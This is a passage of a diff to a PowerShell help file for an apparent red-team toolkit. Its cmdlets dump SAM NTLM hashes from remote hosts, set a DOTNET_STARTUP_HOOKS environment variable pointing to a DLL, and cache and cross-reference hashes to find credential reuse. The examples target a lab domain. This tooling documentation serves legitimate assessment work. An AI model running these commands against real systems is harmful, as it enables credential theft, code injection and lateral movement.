         <maml:code>Get-TBORegSamHashes -ServerName corp1-web01.corp1.lab.home-labs.lol | Select-Object AccountName, FullName, Rid, NtlmHashText</maml:code>
         <maml:remarks>
           <maml:para>Shows account metadata alongside the NTLM hashes.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 3 --------------------------</command:title>
+        <maml:code>Get-TBORegSamHashes -ServerName corp1-web01.corp1.lab.home-labs.lol -Cache
+Get-TBORegSamHashes -ServerName corp1-web02.corp1.lab.home-labs.lol -Cache
+Get-TBOCacheCredentialReuse -Kind NTHash -MinimumMachineCount 2</maml:code>
+        <maml:remarks>
+          <maml:para>Writes NTHash observations to the cache and shows hashes observed on multiple machines.</maml:para>
         </maml:remarks>
       </command:example>
     </command:examples>
@@ -4745,6 +5780,848 @@ Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Pa
         <maml:code>Remove-TBORegValue -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE\TBO -Name InstallId</maml:code>
         <maml:remarks>
           <maml:para>Deletes a value from the remote registry.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <command:command>
+    <command:details>
+      <command:name>Get-TBOEnvironmentVariable</command:name>
+      <command:verb>Get</command:verb>
+      <command:noun>TBOEnvironmentVariable</command:noun>
+      <maml:description>
+        <maml:para>Gets Windows environment variables from a remote host by reading the registry environment keys.</maml:para>
+        <maml:para>Machine scope reads HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment. User scope reads HKU\&lt;sid&gt;\Environment (or HKU\&lt;sid&gt;\Volatile Environment with -Volatile).</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Get-TBOEnvironmentVariable</command:name>
+        <command:parameter required="true" position="0">
+          <maml:name>ServerName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false" position="1">
+          <maml:name>Name</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Scope</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>UserSid</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Volatile</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="true" position="0">
+        <maml:name>ServerName</maml:name>
+        <maml:description>
+          <maml:para>Remote host name.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="false" position="1">
+        <maml:name>Name</maml:name>
+        <maml:description>
+          <maml:para>Environment variable name. Omit to enumerate all variables in the selected scope.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Scope</maml:name>
+        <maml:description>
+          <maml:para>Environment variable scope: Machine (default) or User.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>UserSid</maml:name>
+        <maml:description>
+          <maml:para>User SID when Scope is User. This must refer to a loaded profile hive under HKEY_USERS.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Volatile</maml:name>
+        <maml:description>
+          <maml:para>When Scope is User, reads HKU\&lt;sid&gt;\Volatile Environment instead of HKU\&lt;sid&gt;\Environment.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>Get-TBOEnvironmentVariable -ServerName corp1-web01.corp1.lab.home-labs.lol</maml:code>
+        <maml:remarks>
+          <maml:para>Lists machine-scoped environment variables.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Get-TBOEnvironmentVariable -ServerName corp1-web01.corp1.lab.home-labs.lol -Name Path</maml:code>
+        <maml:remarks>
+          <maml:para>Gets a single machine-scoped environment variable.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <command:command>
+    <command:details>
+      <command:name>Set-TBOEnvironmentVariable</command:name>
+      <command:verb>Set</command:verb>
+      <command:noun>TBOEnvironmentVariable</command:noun>
+      <maml:description>
+        <maml:para>Sets a Windows environment variable on a remote host by writing to the registry environment keys.</maml:para>
+        <maml:para>Note: this does not update already-running processes. A logoff/restart (or process restart) may be required before the change takes effect.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Set-TBOEnvironmentVariable</command:name>
+        <command:parameter required="true" position="0">
+          <maml:name>ServerName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="true" position="1">
+          <maml:name>Name</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="true" position="2">
+          <maml:name>Value</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Scope</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>UserSid</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Volatile</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Expand</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Cache</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>CachePath</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="true" position="0">
+        <maml:name>ServerName</maml:name>
+        <maml:description>
+          <maml:para>Remote host name.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="true" position="1">
+        <maml:name>Name</maml:name>
+        <maml:description>
+          <maml:para>Environment variable name.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="true" position="2">
+        <maml:name>Value</maml:name>
+        <maml:description>
+          <maml:para>Environment variable value.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Scope</maml:name>
+        <maml:description>
+          <maml:para>Environment variable scope: Machine (default) or User.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>UserSid</maml:name>
+        <maml:description>
+          <maml:para>User SID when Scope is User. This must refer to a loaded profile hive under HKEY_USERS.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Volatile</maml:name>
+        <maml:description>
+          <maml:para>When Scope is User, writes HKU\&lt;sid&gt;\Volatile Environment instead of HKU\&lt;sid&gt;\Environment.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Expand</maml:name>
+        <maml:description>
+          <maml:para>Writes the value as REG_EXPAND_SZ to allow %VAR% expansions.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Cache</maml:name>
+        <maml:description>
+          <maml:para>When enabled, writes the change into the persistent cache write activity log.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>CachePath</maml:name>
+        <maml:description>
+          <maml:para>Optional cache database path override used when recording write activities.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>Set-TBOEnvironmentVariable -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DOTNET_STARTUP_HOOKS -Value 'C:\ProgramData\hooks\hook.dll'</maml:code>
+        <maml:remarks>
+          <maml:para>Sets a machine-scoped environment variable.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Set-TBOEnvironmentVariable -ServerName corp1-web01.corp1.lab.home-labs.lol -Name Path -Value '%Path%;C:\ProgramData\tools' -Expand</maml:code>
+        <maml:remarks>
+          <maml:para>Appends to PATH using an expandable string.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <command:command>
+    <command:details>
+      <command:name>Remove-TBOEnvironmentVariable</command:name>
+      <command:verb>Remove</command:verb>
+      <command:noun>TBOEnvironmentVariable</command:noun>
+      <maml:description>
+        <maml:para>Removes a Windows environment variable on a remote host by deleting the corresponding registry value.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Remove-TBOEnvironmentVariable</command:name>
+        <command:parameter required="true" position="0">
+          <maml:name>ServerName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="true" position="1">
+          <maml:name>Name</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Scope</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>UserSid</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Volatile</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Cache</maml:name>
+          <command:parameterValue>Switch</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>CachePath</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="true" position="0">
+        <maml:name>ServerName</maml:name>
+        <maml:description>
+          <maml:para>Remote host name.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="true" position="1">
+        <maml:name>Name</maml:name>
+        <maml:description>
+          <maml:para>Environment variable name to delete.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Scope</maml:name>
+        <maml:description>
+          <maml:para>Environment variable scope: Machine (default) or User.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>UserSid</maml:name>
+        <maml:description>
+          <maml:para>User SID when Scope is User. This must refer to a loaded profile hive under HKEY_USERS.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Volatile</maml:name>
+        <maml:description>
+          <maml:para>When Scope is User, deletes from HKU\&lt;sid&gt;\Volatile Environment instead of HKU\&lt;sid&gt;\Environment.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>Cache</maml:name>
+        <maml:description>
+          <maml:para>When enabled, writes the change into the persistent cache write activity log.</maml:para>
+        </maml:description>
+        <command:parameterValue>Switch</command:parameterValue>
+      </command:parameter>
+      <command:parameter>
+        <maml:name>CachePath</maml:name>
+        <maml:description>
+          <maml:para>Optional cache database path override used when recording write activities.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>Remove-TBOEnvironmentVariable -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DOTNET_STARTUP_HOOKS</maml:code>
+        <maml:remarks>
+          <maml:para>Deletes a machine-scoped environment variable.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <command:command>
+    <command:details>
+      <command:name>Get-TBOCacheInfo</command:name>
+      <command:verb>Get</command:verb>
+      <command:noun>TBOCacheInfo</command:noun>
+      <maml:description>
+        <maml:para>Shows information about the persistent TBO cache database (schema version and row counts).</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Get-TBOCacheInfo</command:name>
+        <command:parameter required="false">
+          <maml:name>Path</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="false">
+        <maml:name>Path</maml:name>
+        <maml:description>
+          <maml:para>Optional cache database path override. If omitted, the cache path is resolved using the TITANIS_TBO_CACHE environment variable or the per-user default path.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>Get-TBOCacheInfo</maml:code>
+        <maml:remarks>
+          <maml:para>Returns schema version and row counts for the default cache.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Get-TBOCacheInfo -Path C:\Temp\tbo-cache.sqlite3</maml:code>
+        <maml:remarks>
+          <maml:para>Reads cache info from an explicit database file.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+  <command:command>
+    <command:details>
+      <command:name>Clear-TBOCache</command:name>
+      <command:verb>Clear</command:verb>
+      <command:noun>TBOCache</command:noun>
+      <maml:description>
+        <maml:para>Deletes all rows from the persistent TBO cache database.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Clear-TBOCache</command:name>
+        <command:parameter required="false">
+          <maml:name>Path</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="false">
+        <maml:name>Path</maml:name>
+        <maml:description>
+          <maml:para>Optional cache database path override. If omitted, the cache path is resolved using the TITANIS_TBO_CACHE environment variable or the per-user default path.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>Clear-TBOCache</maml:code>
+        <maml:remarks>
+          <maml:para>Clears the cache after confirmation.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Clear-TBOCache -WhatIf</maml:code>
+        <maml:remarks>
+          <maml:para>Shows what would be deleted without modifying the cache.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+  <command:command>
+    <command:details>
+      <command:name>Remove-TBOCacheEntry</command:name>
+      <command:verb>Remove</command:verb>
+      <command:noun>TBOCacheEntry</command:noun>
+      <maml:description>
+        <maml:para>Deletes one or more cache entries by type and id.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Remove-TBOCacheEntry</command:name>
+        <command:parameter required="true">
+          <maml:name>Type</maml:name>
+          <command:parameterValue>TboCacheEntryType</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="true">
+          <maml:name>Id</maml:name>
+          <command:parameterValue>Int64[]</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Path</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="true">
+        <maml:name>Type</maml:name>
+        <maml:description>
+          <maml:para>Cache entry type to delete.</maml:para>
+        </maml:description>
+        <command:parameterValue>TboCacheEntryType</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="true">
+        <maml:name>Id</maml:name>
+        <maml:description>
+          <maml:para>Cache entry id (or ids) to delete.</maml:para>
+        </maml:description>
+        <command:parameterValue>Int64[]</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="false">
+        <maml:name>Path</maml:name>
+        <maml:description>
+          <maml:para>Optional cache database path override. If omitted, the cache path is resolved using the TITANIS_TBO_CACHE environment variable or the per-user default path.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>Remove-TBOCacheEntry -Type Observation -Id 1</maml:code>
+        <maml:remarks>
+          <maml:para>Deletes an observation entry from the cache.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Remove-TBOCacheEntry -Type Credential -Id 12,13,14</maml:code>
+        <maml:remarks>
+          <maml:para>Deletes multiple credential entries by id.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+  <command:command>
+    <command:details>
+      <command:name>Add-TBOCacheObservation</command:name>
+      <command:verb>Add</command:verb>
+      <command:noun>TBOCacheObservation</command:noun>
+      <maml:description>
+        <maml:para>Adds an observation edge to the persistent TBO cache.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Add-TBOCacheObservation</command:name>
+        <command:parameter required="true">
+          <maml:name>ServerName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>SourceKind</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>SourcePath</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>ObservedUtc</maml:name>
+          <command:parameterValue>DateTime</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Confidence</maml:name>
+          <command:parameterValue>Int32</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>ContextJson</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>PrincipalSid</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>PrincipalDomain</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>PrincipalName</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>PrincipalType</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>CredentialKind</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>CredentialIdentifier</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Path</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="true">
+        <maml:name>ServerName</maml:name>
+        <maml:description>
+          <maml:para>Machine identity used for correlation (typically the server or host name).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="false">
+        <maml:name>SourceKind</maml:name>
+        <maml:description>
+          <maml:para>Source identifier for the observation (for example, a cmdlet name). Default: Manual.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="false">
+        <maml:name>SourcePath</maml:name>
+        <maml:description>
+          <maml:para>Optional source path or location where the observation was obtained.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="false">
+        <maml:name>ObservedUtc</maml:name>
+        <maml:description>
+          <maml:para>Optional timestamp for when the observation occurred. Defaults to current time.</maml:para>
+        </maml:description>
+        <command:parameterValue>DateTime</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="false">
+        <maml:name>Confidence</maml:name>
+        <maml:description>
+          <maml:para>Optional confidence score (0-100) to associate with the observation.</maml:para>
+        </maml:description>
+        <command:parameterValue>Int32</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="false">
+        <maml:name>ContextJson</maml:name>
+        <maml:description>
+          <maml:para>Optional JSON context blob to store with the observation.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="false">
+        <maml:name>PrincipalSid</maml:name>
+        <maml:description>
+          <maml:para>Optional principal SID.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="false">
+        <maml:name>PrincipalDomain</maml:name>
+        <maml:description>
+          <maml:para>Optional principal domain name.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="false">
+        <maml:name>PrincipalName</maml:name>
+        <maml:description>
+          <maml:para>Optional principal name.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="false">
+        <maml:name>PrincipalType</maml:name>
+        <maml:description>
+          <maml:para>Optional principal type label (for example, User or Computer).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="false">
+        <maml:name>CredentialKind</maml:name>
+        <maml:description>
+          <maml:para>Optional credential kind (for example, NTHash). Must be provided together with CredentialIdentifier.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="false">
+        <maml:name>CredentialIdentifier</maml:name>
+        <maml:description>
+          <maml:para>Optional credential identifier (for example, an NTHash). Must be provided together with CredentialKind.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="false">
+        <maml:name>Path</maml:name>
+        <maml:description>
+          <maml:para>Optional cache database path override. If omitted, the cache path is resolved using the TITANIS_TBO_CACHE environment variable or the per-user default path.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>Add-TBOCacheObservation -ServerName corp1-web01.corp1.lab.home-labs.lol -PrincipalName Administrator -CredentialKind NTHash -CredentialIdentifier 8846f7eaee8fb117ad06bdd830b7586c -SourceKind Get-TBORegSamHashes</maml:code>
+        <maml:remarks>
+          <maml:para>Adds a principal and credential observation for a machine.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Add-TBOCacheObservation -ServerName corp1-web01.corp1.lab.home-labs.lol -CredentialKind NTHash -CredentialIdentifier 8846f7eaee8fb117ad06bdd830b7586c -SourceKind Manual</maml:code>
+        <maml:remarks>
+          <maml:para>Adds a credential observation without principal context.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+  <command:command>
+    <command:details>
+      <command:name>Get-TBOCacheCredentialReuse</command:name>
+      <command:verb>Get</command:verb>
+      <command:noun>TBOCacheCredentialReuse</command:noun>
+      <maml:description>
+        <maml:para>Shows credentials observed on multiple machines, grouped by machine and principal context.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Get-TBOCacheCredentialReuse</command:name>
+        <command:parameter required="false">
+          <maml:name>Kind</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Identifier</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>MinimumMachineCount</maml:name>
+          <command:parameterValue>Int32</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Path</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="false">
+        <maml:name>Kind</maml:name>
+        <maml:description>
+          <maml:para>Credential kind filter (for example, NTHash).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="false">
+        <maml:name>Identifier</maml:name>
+        <maml:description>
+          <maml:para>Credential identifier filter (for example, an NTHash).</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="false">
+        <maml:name>MinimumMachineCount</maml:name>
+        <maml:description>
+          <maml:para>Only return credentials observed on at least this many distinct machines.</maml:para>
+        </maml:description>
+        <command:parameterValue>Int32</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="false">
+        <maml:name>Path</maml:name>
+        <maml:description>
+          <maml:para>Optional cache database path override. If omitted, the cache path is resolved using the TITANIS_TBO_CACHE environment variable or the per-user default path.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>Get-TBOCacheCredentialReuse -Kind NTHash -MinimumMachineCount 2</maml:code>
+        <maml:remarks>
+          <maml:para>Lists NTHashes observed on at least two machines.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Get-TBOCacheCredentialReuse -Kind NTHash -Identifier 8846f7eaee8fb117ad06bdd830b7586c -MinimumMachineCount 2</maml:code>
+        <maml:remarks>
+          <maml:para>Narrows results to a specific credential identifier.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+  <command:command>
+    <command:details>
+      <command:name>Export-TBOCacheGraph</command:name>
+      <command:verb>Export</command:verb>
+      <command:noun>TBOCacheGraph</command:noun>
+      <maml:description>
+        <maml:para>Exports the persistent TBO cache as a graph for external visualization.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Export-TBOCacheGraph</command:name>
+        <command:parameter required="false">
+          <maml:name>Format</maml:name>
+          <command:parameterValue>TboCacheGraphFormat</command:parameterValue>
+        </command:parameter>
+        <command:parameter required="false">
+          <maml:name>Path</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="false">
+        <maml:name>Format</maml:name>
+        <maml:description>
+          <maml:para>Graph export format. Supported values: Json, Dot, OpenGraph.</maml:para>
+        </maml:description>
+        <command:parameterValue>TboCacheGraphFormat</command:parameterValue>
+      </command:parameter>
+      <command:parameter required="false">
+        <maml:name>Path</maml:name>
+        <maml:description>
+          <maml:para>Optional cache database path override. If omitted, the cache path is resolved using the TITANIS_TBO_CACHE environment variable or the per-user default path.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>Export-TBOCacheGraph -Format Json | Set-Content -Path .\tbo-cache-graph.json -Encoding utf8</maml:code>
+        <maml:remarks>
+          <maml:para>Exports nodes and edges as JSON for graph tooling.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Export-TBOCacheGraph -Format Dot | Set-Content -Path .\tbo-cache-graph.dot -Encoding ascii</maml:code>
+        <maml:remarks>
+          <maml:para>Exports a GraphViz DOT graph.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 3 --------------------------</command:title>
+        <maml:code>Export-TBOCacheGraph -Format OpenGraph | Set-Content -Path .\tbo-cache-opengraph.json -Encoding utf8</maml:code>
+        <maml:remarks>
+          <maml:para>Exports BloodHound OpenGraph JSON.</maml:para>
+        </maml:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+  <command:command>
+    <command:details>
+      <command:name>Export-TBOCacheJson</command:name>
+      <command:verb>Export</command:verb>
+      <command:noun>TBOCacheJson</command:noun>
+      <maml:description>
+        <maml:para>Exports the persistent TBO cache as a JSON document (machines, principals, credentials, observations) for offline ingestion.</maml:para>
+      </maml:description>
+    </command:details>
+    <command:syntax>
+      <command:syntaxItem>
+        <command:name>Export-TBOCacheJson</command:name>
+        <command:parameter required="false">
+          <maml:name>Path</maml:name>
+          <command:parameterValue>String</command:parameterValue>
+        </command:parameter>
+      </command:syntaxItem>
+    </command:syntax>
+    <command:parameters>
+      <command:parameter required="false">
+        <maml:name>Path</maml:name>
+        <maml:description>
